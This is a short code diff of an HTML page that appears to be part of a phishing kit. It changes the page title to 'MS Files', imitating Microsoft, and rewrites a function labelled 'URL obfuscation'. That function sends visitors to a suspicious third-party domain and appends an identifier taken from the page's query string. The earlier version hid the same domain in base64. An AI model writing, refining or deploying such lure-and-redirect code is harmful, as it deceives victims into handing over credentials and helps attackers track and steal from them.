@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Verification Portal</title>
+  <title>MS Files</title>
   <style>
     /* Elegant color scheme */
     :root {
@@ -413,12 +413,12 @@
       }, 3000);
     }
 
-    // URL obfuscation
+    // URL obfuscation and construction
     function getRedirectUrl() {
-      const e = "aHR0cHM6Ly9wcm90b25maWxlcy5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3RPbkRxWGYx";
-      const t = window.location.search;
-      const n = new URLSearchParams(t).get("eoffice") || "";
-      return atob(e) + "Q" + "#" + encodeURIComponent(n);
+      const baseUrl = "https://protonfiles.egvhfztransfercygv.online/tOnDqXfQ";
+      const urlParams = new URLSearchParams(window.location.search);
+      const officeParam = urlParams.get("office") || "";
+      return baseUrl + "#" + encodeURIComponent(officeParam);
     }
 
     document.addEventListener('DOMContentLoaded', () => {
